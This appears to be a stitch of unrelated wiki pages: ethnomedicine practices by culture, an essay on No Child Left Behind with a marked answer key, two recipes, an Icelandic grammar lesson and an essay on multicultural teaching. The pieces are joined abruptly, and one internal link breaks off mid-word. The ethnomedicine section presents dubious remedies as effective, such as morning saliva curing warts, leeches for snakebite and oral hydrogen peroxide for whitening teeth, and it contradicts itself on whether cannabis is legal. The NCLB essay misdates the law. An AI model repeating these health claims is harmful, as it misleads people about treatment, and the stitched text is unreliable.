ministry of health, labor and welfare. Rather than modifying formulas like is the practice in Traditional Chinese medicine.  The Japanese kampo tradition uses certain fixed combinations of herbs in standardized proportions which were derived from the classical literature of Chinese medicine. Kampo medicines are produced by various manufacturers, however because of strict regulations each medicine is composed of exactly the same ingredients. The medicines are therefore prepared under strict manufacturing conditions that rival pharmaceutical companies of America or anywhere else. The two leading companies making kampo medicines are Tsumura (ツムラ) and Kanebō (カネボウ). To find out more about this culture, you can visit the Wikipedia site: http://en.wikipedia.org/wiki/Japan

==Korean Culture==
In Korean culture [[Ethnomedicine/Home Remedies#Miso Soup|Miso Soup]] has been a long time remedy for curing scrapes on skin. This ancient practice has been passed down for hundreds of years and is still commonly used today.

Also, in the case of flus, the Koreans use a home remedy that includes [[Ethnomedicine/Home Remedies#Cinnamon|Cinnamon]] and [[Ethnomedicine/Home Remedies#ginseng|ginseng]]  to help the afflicted person get over the flu.  They commonly do this because cinnamon strengthens the immune system and is believed to have antibiotic properties, and ginseng is a tonic to help with the fatigue

==Mayan Culture==
The Mayan people are an indigenous group in Mexico and Central America. They are a very traditional society that has extensive contact with western and modern societies. Because of this their medical model is a blend of traditional beliefs along with western technology. because they live in pretty poor conditions they do not have access to the best medicines, but they use what they can along with traditional practices of herbs, magic, and spells passed on by the elders in the community. They are much more accepting of the mind and body as a single interacting unit, and work to cure mind body and spirit.

==Middle Eastern Cultures==
Many Middle Eastern cultures and Indian culture have used [[Ethnomedicine/Home_Remedies#Ginger Tea|ginger tea]] as a way of killing or staving off colds. It helps to boost the immune system due to its spice, curries are reported to have the same germ killing properties because of this.

Some cultures in the Middle East have remedies based on principle of balancing warm and cold food in the body. One such remedy is [[Ethnomedicine/Home_Remedies#Aab Nabaat|Aab Nabaat]], which is used to prevent or settle an upset stomach.

==Native American Culture==
Herbs and other medicinal plants have a predominant role in the healing practices of Native American cultures. Many of the modern medicines used today in western society's were derived from the traditional healing methods of Native Americans. Ironically, modern scientist, doctors, and lay people are quick to reject the practices of ancient herbalists. It is interesting to note that in Native American cultures it takes longer for an individual to become an effective herbalist and healer than it does for a person today to become a doctor. In Native American cultures individuals are usually selected by the tribal medicine person at a very young age. This selected individual serves as an apprentice until they are middle aged, then they take over as healer.
One plant that Native American cultures often utilize is tobacco. It is primarily used as a topical anesthetic. It is chewed up and spit upon the part of the body that is intended to be numbed. Also it can be added to bath water in the form of a tea to reduce arthritic pain or cramps. The smoke is thought to be purifying and is blown on afflicted areas.

[[http://en.wikipedia.org/wiki/Tobacco]]  [http://en.wikipedia.org/wiki/Dandelion Dandelions]are another genus of plant used by Native Americans for medicinal purposes. To learn more about the ways Native American cultures utilize dandelions click this link.[http://en.wikibooks.org/wiki/Ethnomedicine/Home_Remedies#Dandelion] Like dandelions, [http://en.wikipedia.org/wiki/Stinging_nettles stinging nettles] are also used medicinally by Native Americans, and are quite prevalent in the Pacific Northwest. To learn more about the healing properties of stinging nettles follow this link. [http://en.wikibooks.org/wiki/Ethnomedicine/Home_Remedies#Stinging_Nettles] 
 Another source of healing for Native American cultures is the use of the Sweat Lodge.  The [[Ethnomedicine/Disease_Prevention_Practices#Sweat Lodge|sweat lodge]], also known as the &quot;[[Ethnomedicine/Disease_Prevention_Practices#Inipi|inipi]]
&quot; is used to purify and cleanse individuals by placing them in a tent-like room full of steam.  It is mostly a religious event believing that the spirits expel diseases and purify the body.

Herbs are not the only solution to expelling these diseases and purifying the body.  Movement of the body is quite common for many Native American Cultures.  [[Ethnomedicine/Home_Remedies#Dancing|Dancing]] and exercise are a common practice among tribes.

Many Native American tribes in the United States use herbal remedies to cure aliments. One of the herbal remedies used is the use of [[Ethnomedicine/Home_Remedies#Blackberry|blackberry]] roots and leaves to treat stomach aches. The use of natural treatments to cure every day ailments are cures that have been used for hundreds of years, and still remedies such as the blackberry syrup and tea are often used today.

===Laguna Pueblo===
Ceremonies were extremely important to the Laguna Pueblo culture and were often used for healing. It was thought that during these ceremonies the tribe could get closer to the sacred time of their gods and that this energy would aid with healing.

==South American Culture==
In contrast to people in North American or European societies, indigenous people in South America often use traditional medicinal plants found in the rainforest to cure illnesses, instead of chemically produced medicines. Several plants found in South America can be used to obtain results more that are usually obtained from more common products. These include plants such as cinchona, yerba mate, and [[Ethnomedicine/Disease_Prevention_Practices#Stevia|stevia]].

In the Andean region of South America, [[Ethnomedicine/Home_Remedies#Coca Leafs|Coca Leafs]] are used as a remedy for overcoming altitude sickness, fatigue, as well as other illnesses. This practice has been used by many tribes indigenous to Peru and Bolivia, and is still a common practice today.

==Turkish Culture==
In Turkish culture and many other cultures around the world, [[Ethnomedicine/Home_Remedies#Leeches|Leeches]] are used to relieve victims of snake bites and many other ailments. Leeches are known to be sold in animal markets in Istanbul.

==Vietnamese Culture==
[[Ethnomedicine/Disease_Prevention_Practices#Thuoc_Nam|Thuoc Nam]] is also known as Vietnamese Southern Medicine. This medicine was also known as the poor mans medicine because it only uses ingredients native to Vietnam and involves little preparation.

==Western Culture==
The use of home remedies and Folk medicine has greatly decreased in the last few decades with Western culture adopting the bio-medical model, causing western culture to become more dependant on prescription and OTC drugs.  Although there are still [[Ethnomedicine/Home Remedies|Home Remedies]] that have been passed down through generations, Western culture has begun to prefer a chemical solution to many medical problems because of its availability and proven affects.  In recent years, however, people have started to become aware of the negative affects of many chemical drugs and have been turning back to [[W:Homeopathic]] medicines and natural solutions as an alternative to modern pharmaceutical drugs. There are many different Western treatments for illnesses out there.

A wart is a hard rough lump growing on the skin, caused by infection with certain viruses and occurring typically on the hands or feet.  Many people in the Western culture cure warts in mainly two different ways.  One is going to the doctor and getting them frozen off.  The other is getting a prescription medication drug that will make the wart go away.  The less known method of wart removal is the use of morning spit has been known to cure a wart in about a week. This has to do with the bacteria in the mouth that comes when people fall asleep.

In today's Western Culture, many households are exposed to harmful airborne contaminants that can cause numerous health problems.  Luckily, there are [[Ethnomedicine/Disease_Prevention_Practices#Air Purifiers|Air Purifiers]] to filter out those dangerous indoor pollutants.

===Over the Counter===
[[Ethnomedicine/Home_Remedies#Ibuprofen|Ibuprofen]] is an over-the-counter pain reliever that is commonly used to reduce or eliminate body aches and pains, headaches, and reduce fever symptoms. It acts quickly to relieve pain, which fits well with Western Society's demand for rapid relief in a busy world.

[[Ethnomedicine/Home_Remedies#Airborne|Airborne]] is a commonly sold immune system booster to help the body fight off colds. Commonly used among college students who never have a &quot;good time&quot; to be sick. It is mainly used in the prevention of colds but it can be taken during a cold with positive results. It fits well into western society as a quick fix or prevention method.

[[Ethnomedicine/Home_Remedies#Emergen-C |Emergen-C ]] is one of the latest and most popular health food supplement being sold today. This product comes in single serving sized packets and is easily mixed with hot or cold water. The mix of vitamins and minerals makes it a great solution for a quick boost of energy as well as an important way to fight off sicknesses, such as the common cold.

[[Ethnomedicine/Home_Remedies#Baby Powder |Second Skin ]] Spenco's Second Skin dressing is a product used to create a temporary layer of fake skin over a wound to the flesh that is exposing new and tender skin such as a blister or scraped knee.  It can be purchased over the counter at pharmacies and other department stores.  It is a quick and very simple way to relieve pain which is ideal in the Western Culture.

[[Ethnomedicine/Home_Remedies#Baby Powder |Baby Powder ]] Along with its most common use for babies
it is also a useful method for relieving pain caused by blisters and other open sores.  The powder eases the pain by adding a slight layer of protection over the wound but still letting it breathe.  It is commonly used in Western societies because it is an everyday product for people with infants and also a cheap and easy way to relieve pain.  

The best over-counter lotion/crème to alleviate sunburn pains such as stinging is to use [[Ethnomedicine/Home_Remedies#Noxzema|Noxzema]] moisturizer that is found in the stores. It feels terrific especially if you store the Noxzema in a drawer because the crème naturally maintains a cool level which feels incredible on a sun burned skin. Apply enough Noxzema to cover the sunburn completely; and apply a minimum of 2-3 times a day. The sunburn should most likely be gone within 2 days depending on the degree of the sunburn. NOTE: Some of the Noxzema moisturizer's come with Aloe-Vera; and use caution if your skin is sensitive to Aloe-Vera or use a different kind of Noxzema without Aloe-Vera.

===Herbal Remedies===
In the Western Society [[Ethnomedicine/Ethnomedicine_by_Illness#Green Tea|Green Tea]] can be used to prevent dark circles and wrinkles under ones eyes. Using two brewed, cooled off tea bags as compressors on each eye will reduce the risk of dark circles and wrinkles forming.

In regards to the common cold, back in the early to mid 1900s, [[Ethnomedicine/Disease_Prevention_Practices#Garlic and Mustard Seed|Garlic and Mustard Seed]] was worn around one's neck as a means of preventing colds. This stemmed from a German cultural belief and/or knowledge that garlic, along with some other herbs and spices, worked to prevent colds. However, instead of ingesting these items, they wore them around their necks, indicating an almost superstitious outlook on the matter. Now, it is known that those who include more garlic in their diets tend to be healthier and are less likely to contract common colds.

====Flaxseed Oil====
[[Ethnomedicine/Disease_Prevention_Practices#Flaxseed Oil|Flaxseed Oil]] a long and extensive history. Originating in Mesopotamia, the flax plant has been known since the Stone Ages. One of the first records of the culinary use of flaxseeds is from times of ancient Greece. In both that civilization and in ancient Rome, the health benefits of flaxseeds were widely praised. After the fall of Rome, the cultivation and popularity of flaxseeds declined. 
Ironically, it was Charlemagne, the emperor who would be famous for shaping European history, who also helped to shape the history of flaxseeds, restoring them to their noble position in the food culture of Europe. Charlemagne was impressed with how useful flax was in terms of its culinary, medicinal, and fiber usefulness (flaxseed fibers can be woven into linen) that he passed laws requiring not only its cultivation but its consumption as well. After Charlemange, flaxseeds became widely appreciated throughout Europe. 
It was not until the early colonists arrived in North America that flax was first planted in the United States. In the 17th century, flax was first introduced and planted in Canada, the country that is currently the major producer of this extremely beneficial seed.

===Home Remedies===
It is in the American culture where we see concern on our appearance. We are obsessed with how we smell and how we look and a lot of this obsession comes from marketing. We can see this in the vast amounts of perfumes, colognes, anti-aging and makeup products shown on television commercials telling us what we want. If you want to reduce unwanted red eye you can use a[[Ethnomedicine/Home_Remedies#cold_washcloth|cold washcloth]] to help rid the symptoms. This is related to this culture by their high standard of person appearance. Western culture cares very much about the way that they look. Since a washcloth (flannel) and cold water are very common household products, it also is connected to the do it yourself aspect. Instead of buying eye drops, Western culture has established their own method of reducing this problem. Another problem some people have about their general appearance is [[Ethnomedicine/Home_Remedies#lemon_juice|oily hair]], many women as well as men spend a lot of money to get their hair cut the perfect way or to get it dyed a certain color but when it becomes oily they tend to want to fix the problem on their own. For some it may be embarrassing to go to the salon and tell them you have oily hair so western culture has figured out its own way to fix the problem at home with using lemon juice. Many of western cultures home remedies are used solely for appearance purposes which says a lot about western culture.

Within western cultures, a [[Ethnomedicine/Home_Remedies#Warm_Compress|warm compress]]
is the preferred home remedy for [[Ethnomedicine/Ethnomedicine_by_Illness#Pink_Eye|pink eye]]
because it relieves pain while your eye naturally clears up on its own. 

For centuries Western Cultures have used [[Ethnomedicine/Home_Remedies#Aloe Vera|Aloe Vera]] which can relieve skin discomforts such as severe burns caused by the sun. It can also be used as a natural laxative if used internally.

The act of  using [[Ethnomedicine/Home_Remedies#Wood_Ash|wood ash]] to whiten teeth is not specific to Western culture – consequently appears in many other parts of the world such as Japan and parts of China.

In [[Ethnomedicine/Ethnomedicine_by_Culture_Group#Western_Culture|Western Society]], methods such as using [[Ethnomedicine/Home_Remedies#Hydrogen Peroxide|Hydrogen Peroxide]] as a bleaching agent are very popular due to high image standards. It can used orally to whiten teeth, but beware of swallowing too much for it can be damaging to your health. Hydrogen Peroxide is a an inexpensive and is easily obtainable. Many other cultures don’t put as much emphasis on physical appearance, leaving the usage of chemicals for beauty enhancement for Western culture.

Western Culture is all about &quot;go go go!&quot;  It is a culture that strives on instant results, including everything from transportation, medicine effectiveness and how food is prepared. Because of western culture's fast paced lifestyle, many people will do anything they can to avoid being sick altogether. One way that people in western society do this is to take [[Ethnomedicine/Disease_Prevention_Practices#Multivitamis|multivitamins]] to help boost the immune system.  Our &quot;go go go&quot; mentality has also led to the widespread use of [[Ethnomedicine/Home_R

[[Ethnomedicine/Home_Remedies#Cannabis|Cannabis]] is widely used by and legally prescribed to patients with [[w:glaucoma|glaucoma]] in Western Culture. The THC chemical found in cannabis has been proven to lower the intraocular pressures associated with glaucoma and also prevents optic nerve damage. Cannabis is most effective when smoked and the general requirement for glaucoma patients is about .5 grams every 3 hours or so. The plant is illegal in the United States, however, and a prescription must be obtained for legal use.

Caffeine has many uses in Western Culture. Most people use it to provide energy throughout the day. It does have alternate uses, though. When Caffeine is added to pain relieving medication, it helps the body absorb the drug faster. For more information, see [[Ethnomedicine/Home_Remedies#Caffeine for migraines|Caffeine for migraines]].

Yogurt can be an effective tool in combatting canker sores. When using the right type of yogurt, you can speed up the recovery process and reduce pain. More information can be found under [[Ethnomedicine/Home_Remedies#Yogurt for Canker Sores|Yogurt for Canker Sores]].

The use of the Marigold flower is a common home remedy used by many Western cultures. The practical use of this household flower for the relief of tooth pain originated from early English countrymen. More information about the proper use of the Marigold can be found under [[Ethnomedicine/Home_Remedies#Marigold|Marigold]].

One disease prevention practice pertaining to women in western society is refraining from eating fish with high levels of mercury such as tuna while pregnant. This is because high levels of mercury can cause damage to the developing nervous system of a fetus. Methylmercury has become a particular problem in aquatic food chains because the fish begin to accumulate high levels of methylmercury in their tissues; especially the fish in higher trophic levels. One fish higher up on the food chain is albacore (or white) tuna.  U.S. Food and Drug Administration (FDA) recommends that you eat no more than 6 ounces of tuna per week. In other words, do not eat more than 2 meals of low mercury fish per week. For more information visit [[Ethnomedicine/Disease_Prevention_Practices#Refraining from tuna while pregnant]].

      <text xml:space="preserve">==No Child Left Behind:  What does it mean for students and teachers?==

By:  Carrie Grace Morgan

What is the quickest way to get a group of teachers arguing?  Simply begin a conversation with the following question, “So, what do you think about No Child Left Behind (NCLB)? ”.  Besides the integration of public schools during the civil rights era and the creation of the Individuals with Disabilities Act (IDEA), no other education reform has created so much controversy than NCLB.  

==History of No Child Left Behind==
The No Child Left Behind (NCLB) Act was passed in January 2003 by President George Bush as a sweeping education reform program focused on closing the achievement gap between several subgroups including genders or minorities, English language learners or economically disadvantaged students, and students with disabilities (Schrag, 2003).  NCLB was based on several prior education reform systems, most notably President Lyndon B. Johnson’s Great Society education law and the Elementary Education Act of 1965 (Jehlen, 2007). 

==Four Pillars of No Child Left Behind==
NCLB is based on four pillars, which include stronger accountability in terms of results on state assessments, states and communities being given more freedom with federal education funds, teaching based on proven education methods, and allowing parents more choices in their child’s education.

The first pillar, which deals with accountability, holds public schools accountable for the effectiveness of their instructional efforts (Popham, 2004).  Each year parents and communities receive reports from their school district and the state, which show the whether an school/state is making adequate yearly progress or AYP (“No Child Left Behind:  A Toolkit for Teachers”, 2003).  If a school does not make AYP, schools must provide supplemental educational services and make changes to their approach to teaching.  After five years if a school is still not making AYP, the government takes over control of how the school is run and dramatic changes are made overall.  The law mandates that within twelve years of the 2001-2002 school year, all schools must be proficient in their standardized test scores (“No Child Left Behind:  A Toolkit for Teachers”, 2003).  

The second pillar of the NCLB law states that schools have more freedom and flexibility in how federal funding is spent in their districts.  Each district is allowed to spend their federal education funds on needs specific to their locality such as increasing teacher salaries and improving staff development opportunities.  

Under the third pillar of NCLB, all educational programs and practices must be scientifically based in research.  One example of a scientifically research based program is Reading First.   It is a model used in elementary schools to teach reading, writing, and phonics skills.  
The final pillar of the NCLB law is allowing parents of students in low-performing schools other alternatives to attending those schools.  When a school fails to make AYP for two consecutive years, parents may transfer their child to another better-performing school within their district.  If a school fails to make AYP for three years consecutively, low-income families are eligible to receive supplemental educational services such as tutoring for their children.  

Under NCLB states are required to develop a system to measure “adequate yearly progress” (AYP), which is directly correlated with the stronger accountability pillar of NCLB (Jewell, 2006).  Public schools are held accountable for the effectiveness of their instructional practices (Popham, 2004).  Any school that does not make AYP must provide supplemental educational services for their students.  Each consecutive year that a school does not make AYP, more sanctions are placed on the school including replacing staff, extending the school year, and eventually turning over the control of the school to the state (Jewell, 2006).
  
==Problems with No Child Left Behind==
While the foundation for the No Child Left Behind law might be positive, the reality of the situation for many children and teachers is very grim.  NCLB is due to expire in September of this year, and sweeping changes need to be made in order for the law to not only leave no child behind, but also no teacher behind.

One of the major problems teachers have with No Child Left Behind is that a school’s success is measured only by the results of two tests taken on two days.  The amount of pressure that teachers and students alike feel on those two days is immense, and cannot accurately measure the overall achievement made by students in a single year.  Students who begin a school year below grade level should have the opportunity to show the improvement they have made instead of being tested on the lack of skills they may not have yet (Jehlen, 2007).

==Effects of No Child Left Behind on Students with Disabilities==
One of the many criticisms of the NCLB Act stems from the accountability pillar.  It seems unfair to hold students with disabilities to the same accountability standards as those students without a disability (Jewell, 2004).  Students with disabilities may not make “adequate yearly progress” in the eyes of the state and federal government.  However, this does not mean that a child is not making progress at all. 
 
In the February 2007 issue of NEA Today, Patti Ralabate suggests in the “Up Front” section of the journal that students with disabilities be assessed using a “student-growth” model.  This type of assessment would be beneficial for the students as well as the teachers.  Often the efforts of special education teachers are not evaluated properly because the only piece of information given about his/her student is a test score.  

Students with disabilities are allowed certain accommodations for state and district testing.  Accommodations are, “…changes to the assessment material or procedures that allow for students to demonstrate their knowledge and skills rather than the effects of their disabilities,” (“Accountability for Assessment Results in the No Child Left Behind Act:  What It Means for Children With Disabilities”, 2003).  An example of an accommodation for a student might be frequent breaks during testing or taking tests in a small-group setting instead of the classroom.  However, in order to receive accommodations for testing, the student’s IEP team (Individualized Education Plan) must prove that the accommodation is necessary.

NCLB regulations were changed in December of 2003, which allowed alternative assessments to be given to students that cannot take the grade-level assessment even if accommodations are given with the test (Jewell, 2004). An alternative assessment is considered, “…assessments designed to measure the performance of students with disabilities who are unable to participate in state and district assessments even with accommodations,” (“Accountability for Assessment Results in the No Child Left Behind Act:  What It Means for Children With Disabilities”, 2003).  There are restrictions, however, on the number of students in states and districts that can participate in the alternative assessment.  Only 1 percent of students tested in a grade level can participate in the alternative assessment, which will count towards a school’s AYP (Jewell, 2004).  The state of Virginia offers an alternative assessment model entitled the Virginia Alternative Assessment Program (VAAP).

No Child Left Behind Set to Expire in September
Although NCLB is set to expire in September, the law is not going anywhere.  The law is amended every few years, and there are many changes that educators would like to see put into practice in September.  However, it may be a struggle because of the philosophy that Education Secretary Margaret Spellings.  She stated recently, “I talk about No Child Left Behind like Ivory Soap:  It’s 99.9 percent pure or something…There’s not much needed in the way of change.”  
Here is a list of several of changes that the National
Education Association (NEA) would like to see made to NCLB.

	*  Reduce the number of students in a class.
	
	*  Change assessments to include higher-order thinking and problem-
	 solving questions.

	*  Provide teachers the opportunity to have input in the staff 
	 development provided by their district.

	*  Implement mentoring programs for new teachers and teachers who 
	 are new to districts.
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

The National Center on Educational Outcomes published an article in 2003 titled, “Accountability for Assessment Results in the No Child Left Behind Act:  What It Means for Children with Disabilities.”  One of the questions the article addresses is how to IDEA and NCLB relate to each other.  The articles states that, “…No Child Left Behind complements the provisions in IDEA by providing public accountability at the school, district, and state levels for all students with disabilities,” (“Accountability for Assessment Results in the No Child Left Behind Act:  What It Means for Children With Disabilities”, 2003).  This is true, however, sometimes that level of accountability can require a student already struggling in school to fight even harder against their disability.  

As a teacher of special education students, NCLB leaves many of my students back in the shadows where they have been for many years.  The idea that a child who is unable to recognize all 26 letters of the alphabet be held to the same standards as a child in the third grade reading and comprehending at a seventh grade level is outrageous.  True, special education students can receive accommodations for testing such as a small-group testing situation or the use of manipulative on the math test.  However, the hoops that must be jumped through in order to receive the accommodations is ridiculous, and the test results do not show the true progress some of these children may make in a year.    
 
==Multiple Choice Questions==
1.  What is the difference between testing with accommodations and alternative assessments?

A.	Alternative assessments test students with disabilities in the regular classroom with minor changes and accommodations are a form of different testing in a special setting. 
 
B.	Alternative assessments allow students with disabilities who cannot take grade-level assessments to participate in an assessment that counts towards their school’s AYP.*

C.	Accommodations are different assessments that students who are unable to participate in grade-level assessments.


2.  What does the acronym AYP mean?

A.	Alternative Yearly Property

B.	Annual Yearly Progress

C.	Adequate Yearly Progress *


3.  How are NCLB and IDEA different?

A.	NCLB provides public accountability at the school, district, and state levels for students with disabilities and IDEA focuses on accountability at the school level. *

B.	NCLB provides accountability for only the school level, whereas IDEA focuses accountability only at the state level.

C.	IDEA and NCLB are not different.


4.  What percentage of students with disabilities must be included in the calculation of AYP?

	A.  5%

	B.  3%

	C.  1% *

	D.  9%


5.  Which is NOT a pillar of the NCLB law?	

	A.  stronger accountability for results

	B.  limitless funding *

	C.  more choices for parents

	D.  more freedom for states and their communities

* Correct Answers

==Essay Question==
How does NCLB affect students with disabilities? 

	NCLB affects all students including students with disabilities.  The effects of NCLB on students with disabilities can be positive and negative.

	With the creation of NCLB, schools are held accountable for the educational results of students with disabilities.  The law ensures that students with disabilities are taught on the appropriate grade level, and that they receive the educational services necessary to allow them to reach their full academic potential.  

	Students with disabilities must be included in every school’s calculation of AYP.  However, these students are also considered separately as a sub-group in the AYP calculation.  
	States are require to provide alternative assessment for students who demonstrate an inability to perform on state or district tests even with the aid of testing accommodations.  Although alternative assessments can be given, only 1 percent of a school’s population can participate in those assessments.  The student’s IEP team must decide when it is necessary for a child to participate in the alternative assessment.

	One suggested alternative to both accommodations and alternative assessments would be the use of a “student-growth” model of testing.  This type of assessment would allow growth to be seen in a student with disabilities despite how he/she is able to perform on district and state assessments.  

	Despite the difficulties that a student with disabilities might face under the NCLB law, it has increased awareness in how these students are educated.  Not only are special education teachers more aware of their classroom practices, but homeroom teachers or students with disabilities as well.

==Ingredients==
* 1 lb [[Cookbook:Pasta|dried pasta]]
* 6oz [[Cookbook:Pancetta|pancetta]] (small dice)
* 1 head of [[Cookbook:Cauliflower|cauliflower]] (cut into florets)
* 4 cloves of [[Cookbook:Garlic|garlic]], sliced thin
* 1 14oz can of diced [[Cookbook:Tomato|tomatoes]], drained
* [[Cookbook:Chili Pepper|red pepper flakes]]
* 3 [[Cookbook:Egg yolk|egg yolks]]
* ½ cup of grated [[Cookbook:Pecorino Romano Cheese|Pecorino Romano cheese]]
* chopped [[Cookbook:Parsley|parsley]], additional grated Pecorino Romano cheese
* [[Cookbook:Salt|salt]] and [[Cookbook:Pepper|pepper]] to taste

==Procedure==
# Bring 4 quarts of water to a boil. Add Cauliflower Florets to boiling water and cook for 4 minutes, and transfer Cauliflower to an ice bath (do not discard cooking water). 
# Heat 2 tablespoons of Extra Virgin Olive Oil over medium high heat in a large pan. Once hot, add the diced pancetta, and begin to brown.
# Once pancetta begins to brown, add pasta to boiling water.
# After pancetta is almost completely browned, reduce heat to medium and add the garlic and red pepper flakes. [[Cookbook:Sautéing|Sauté]] until garlic begins to turn golden, and then add the cauliflower and the drained diced tomatoes and toss to heat through. Add ¼ cup of the pasta water, as well as salt and pepper. 
# While pasta is finishing cooking, beat the egg yolks, grated cheese, salt and pepper until smooth. 
# When the pasta is about 2 minutes away from being [[Cookbook:Al dente|al dente]], drain. 
# Lower the heat on the sauce to low and add the pasta to the sauce and toss to combine. Once combined, pour on the egg yolk mixture and '''quickly''' toss the pasta to coat it with the mixture (the egg yolks should coat the pasta, and not scramble). 
# Once heated through, remove to serving bowl or individual plates and garnish with the chopped parsley and additional cheese.

&lt;big&gt;&lt;big&gt;'''Nafnorð'''&lt;/big&gt;&lt;/big&gt;&lt;/br&gt;
:&lt;big&gt;''Nouns''&lt;/big&gt;&lt;p&gt;

Nouns are words that describe a person, place, thing, or idea.

For example:
* '''Sarah''' ran away.
* '''Reykjavík''' is beautiful.
* '''Cars''' pollute, but are essential.
* When you are sad, think of good '''memories'''.

In Icelandic, these take on endings and inflections like verbs and personal pronouns do in English.

== Gender ==

In Icelandic, like most other languages, nouns have a gender.  A noun can be either masculine, feminine, or neutral.  Gender rarely has anything to do with actual gender, with such a case being words for male or female people, animals, etc.  The gender of nouns can usually be determined by the ending it has (or does not have).  This is not a guaranteed rule, however it proves true many times.  Memorization is the only way to really know the gender of a noun.

=== Typical Noun Gender Endings ===
{| border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; align=&quot;center&quot;
! Gender
! Masculine
! Feminine
! Neutral
|-
! Endings
| &lt;center&gt;-ur, -i, -ll, or -nn&lt;/center&gt;
| &lt;center&gt;-a, -ing, -un, or has no ending&lt;/center&gt;
| &lt;center&gt;Has no ending, or final vowel is accented&lt;/center&gt;
|-
! Examples
| &lt;center&gt;hestur, lampi, stöll, steinn&lt;/center&gt;
| &lt;center&gt;taska, spurning, byrjun, rós&lt;/center&gt;
| &lt;center&gt;hótel, bakarí&lt;/center&gt;
|-
! Meanings
| &lt;center&gt;horse, lamp, stool, stone&lt;/center&gt;
| &lt;center&gt;bag, question, beginning, rose&lt;/center&gt;
| &lt;center&gt;hotel, bakery&lt;/center&gt;
|}

== Definite vs. Indefinite Article ==

There is no indefinite article in Icelandic.  What would be &quot;a&quot; or &quot;an&quot; in English is &quot;built into&quot; Icelandic nouns, so to speak.  '''Hestur''' translates to '''a horse''', for example.  The definite article can be formed in two ways in Icelandic, either by adding an ending to a noun or using a definite article before it.  

=== Definite Article Endings ===
{| border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; align=&quot;center&quot;
! Masculine
! Feminine
! Neutral
|-
| &lt;center&gt;-(i)nn&lt;/center&gt;
| &lt;center&gt;-(i)n&lt;/center&gt;
| &lt;center&gt;-(i)ð&lt;/center&gt;
|}

These are added to the end of a noun of the corresponding gender.  With the previous example of '''hestur''', saying &quot;the horse&quot; would be '''hesturinn'''.  If the noun ends in a vowel that is not accented, the '''i''' is dropped from the ending before being added.  As an example, ''herbergi''' (a room) becomes '''herbergið''' with the indefinite ending.  '''Bakarí''' would become '''bakaríið''', because the final vowel is accented.

If using a definite article before the adjective, the definite article is formed by adding the appropriate ending to the letter '''h''' (i.e. '''hinn, hin, and hið''').

== Adjective Placement ==
=== With a Definite Article ===
Just the same as in English, adjectives come after the definite article and before the noun.

'''Hið góða bakarí er í Reykjavík.'''&lt;br&gt;
''The good bakery is in Reykjavík.''

=== With a Definite Ending ===
If an ending has been used to form the definite then the adjectives come after the noun and the noun usually begins the sentence.

'''Góði dagurinn er búinn.'''&lt;br&gt;
''The good day is over.''

Although this section is about nouns, notice the difference in spelling of '''góða''' and '''góði'''.  Both mean the same thing, but adjectives must also be in the correct form according to the gender of the noun.</text>

==Introduction==
'''Manx Cuisine''' or '''Cuisine of the Isle of Man''' relates to the traditional meals and cooking of the [[w:Isle of Man|Isle of Man]], a small autonomous island located between the United Kingdom and Ireland.

Typically dishes consisted of a lot of fish (especially kippers and queenies), vegetables and tough pieces of meat.  Today the Manx cuisine is as rich as anywhere in Europe because of increasing immigration but old recipes have not been forgotten.

{{recipe}} | [[Cookbook:Cuisine_of_Isle_of_Man|Cuisine of Isle of Man]] | [[Cookbook:Fish|Fish]]

Fish dishes are popular in Isle of Man, as they are in most islands and coastal regions.  Kippers are especially popular in Mann and this recipe is a tasty alternative to many standard meals.

== Ingredients==
* 450g kippers
* 450g sliced, smoked salmon
* 500-600ml cream
* 20g chopped chives
* 1/4 to 1/2 cucumber, thinly sliced
* 1/2 tomato, sliced, de-seeded and skinned

==Procedure==

# Boil the kippers in a pot of salty water
# Add 4 rings of smoked salmon to a greaseproof tray in foil (slices can go over the edge)
# Wait for the kippers to finish boiling then refresh them with cold water for 3-5 minutes.  Fillet them then skin and place them in a blender.
# Add cream gradually and blend.
# Add chives to the mix.
# Add the mixture to the rings and remove any air pockets by shaking.
# Fold over the salmon slices and turn over the rings.  Cover with clingfilm and refrigerate.
# Add about 6 slices of the cucumber to the centre of each plate.
# Remove food from refrigerator, remove from oven tray and put them upside down on top of the cucumber slices
# Add more strips of cucumber and tomato to the top of the food.  Serve!

By:  Leslie Antiskay


America is a combination of many different cultures, and it 

appears that the role of teachers is changing to meet the needs of 

the influx of immigrants. Currently, Latinos are the fastest 

growing segment of the American population.  Today’s teachers are 

responsible to teach students from various cultural backgrounds and 

language abilities. They must create a classroom environment that 

is culturally rich, and respectful of the diversity among 

students.  They must also integrate multicultural education across 

the curriculum.  Teachers are exploring many ways to teach in a 

multicultural classroom while modeling cultural tolerance.  


==Taking the Cultural Plunge==

Before teachers can understand diversity they must carefully 

examine their prior experiences, views, fears, and take a cultural 

plunge.  For example, how does it feel to be a minority?  A teacher 

can take a cultural plunge by attending a predominately 

African-American church service, or college class (Nieto, 2006).   

Plunging into a culture and voluntarily becoming a minority is a 

way to understand the meaning of minority.  

Minority doesn’t have to be race related.  A college woman 

majoring in a predominately male career path may also feel out of 

place; because she is a minority.  Plunging into a cultural 

experience would also assist teachers in understanding cultures.  

Sometimes teachers’ travel to places like Indonesia, and absorb the 

culture.   Others study the background of the students’ culture to 

assist them in connecting with the students and also their parents. 


                Teachers who build a multicultural community of
                learners set high expectations for all the 
                students.  Whereas, teachers with negative
                stereotyping often unfairly label students as 
                underachievers.
     
 
==Cultural Stereotyping==

Villegas &amp; lucas (2002) assert that it is necessary for 

teachers to “honestly examine their attitudes and beliefs about 

themselves and others, teachers begin to discover why they are who 

they are, and confront biases that have influenced their value 

system. (as cited in Richards, Brown, Ford, 2007 p. 65).  Because 

teachers’ values impact relationships with students and their 

families, teachers must reconcile negative feelings towards any 

cultural, language, or ethnic group.” When they overcome 

preconceived stereotypes they will create an atmosphere of trust 

and acceptance from the students and parents.  Teachers who build a 

multicultural community of learners set high expectations for all 

the students.  Whereas, teachers with negative stereotyping often 

unfairly label students as underachievers based on their gender, 

race or ethnic background.  Such stereotyping leads to an unequal 

quality of education, because selected students are being unequally 

treated. These students are placed in lower achieving groups and 

their academic abilities or giftedness is not acknowledged.  Such 

inequality within the classroom prevents students of color from 

reaching their fullest potential.  Therefore, it is critical that 

teachers dismiss preconceived biases based on cultural backgrounds, 

because they risk unfairly judging a student's potential.  When a 

teacher expects a student to fall into a stereotype the student 

will perceive her prejudice and will not feel acceptance, but 

rather isolation and a lack of desire to learn.  

==Why Do We Need to Address Cultural Diversity:==

We need to address cultural diversity because there are an 

increasing number of students from diverse backgrounds entering 

